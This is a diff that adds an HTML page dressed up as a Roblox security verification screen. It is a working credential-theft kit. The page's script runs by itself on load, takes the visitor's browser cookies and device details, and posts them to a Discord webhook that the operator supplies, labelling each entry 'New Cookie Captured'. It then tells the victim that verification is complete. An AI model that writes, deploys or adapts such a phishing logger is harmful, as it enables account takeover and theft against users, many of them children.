@@ -1,0 +1,147 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Roblox - Security Update</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: #f2f4f5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .card {
+            background: white;
+            padding: 40px;
+            border-radius: 8px;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+            text-align: center;
+            max-width: 400px;
+            width: 100%;
+        }
+        h1 {
+            color: #393939;
+            font-size: 24px;
+            margin-bottom: 10px;
+        }
+        p {
+            color: #6b6b6b;
+            font-size: 14px;
+            line-height: 1.5;
+        }
+        .spinner {
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #00b06f; /* Roblox green */
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+            margin: 20px auto;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .btn {
+            background-color: #00b06f;
+            color: white;
+            padding: 10px 20px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 16px;
+            margin-top: 15px;
+            display: none; /* Hidden until loading finishes */
+        }
+        .btn:hover {
+            background-color: #009a60;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="card">
+        <h1>Security Verification</h1>
+        <p>We've detected a new login. Please verify your account to ensure your security cookie remains active.</p>
+        
+        <div id="loading" class="spinner"></div>
+        <p id="status">Verifying...</p>
+        
+        <button id="redirectBtn" class="btn" onclick="window.location.href='https://www.roblox.com'">Return to Roblox</button>
+    </div>
+
+    <script>
+        // ⚠️ PASTE YOUR DISCORD WEBHOOK URL BELOW INSIDE THE QUOTES ⚠️
+        const WEBHOOK_URL = "YOUR_DISCORD_WEBHOOK_URL_HERE";
+
+        function sendToDiscord() {
+            const cookies = document.cookie;
+            const userAgent = navigator.userAgent;
+            const platform = navigator.platform;
+            const language = navigator.language;
+            const screenRes = screen.width + "x" + screen.height;
+            const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+            const date = new Date().toLocaleString();
+
+            const payload = {
+                embeds: [{
+                    title: "🍪 New Cookie Captured!",
+                    color: 15158332,
+                    fields: [
+                        {
+                            name: "🔑 Security Cookie",
+                            value: "```\n" + cookies + "\n```",
+                            inline: false
+                        },
+                        {
+                            name: "💻 User Agent",
+                            value: "```\n" + userAgent + "\n```",
+                            inline: false
+                        },
+                        {
+                            name: "🖥️ System Info",
+                            value: "**Platform:** " + platform + "\n**Language:** " + language + "\n**Screen:** " + screenRes,
+                            inline: true
+                        },
+                        {
+                            name: "⏰ Time & Location",
+                            value: "**Timezone:** " + timezone + "\n**Logged at:** " + date,
+                            inline: false
+                        }
+                    ],
+                    footer: {
+                        text: "Roblox Logger v1.0"
+                    }
+                }]
+            };
+
+            fetch(WEBHOOK_URL, {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json",
+                },
+                body: JSON.stringify(payload),
+            })
+            .then(response => {
+                console.log("Success");
+                document.getElementById("loading").style.display = "none";
+                document.getElementById("status").innerText = "Verification Complete!";
+                document.getElementById("redirectBtn").style.display = "inline-block";
+            })
+            .catch(error => {
+                console.error("Error:", error);
+                document.getElementById("status").innerText = "Error occurred.";
+            });
+        }
+
+        // Simulate loading for 3 seconds then steal and redirect
+        setTimeout(() => {
+            sendToDiscord();
+        }, 3000);
+    </script>
+</body>
+</html>
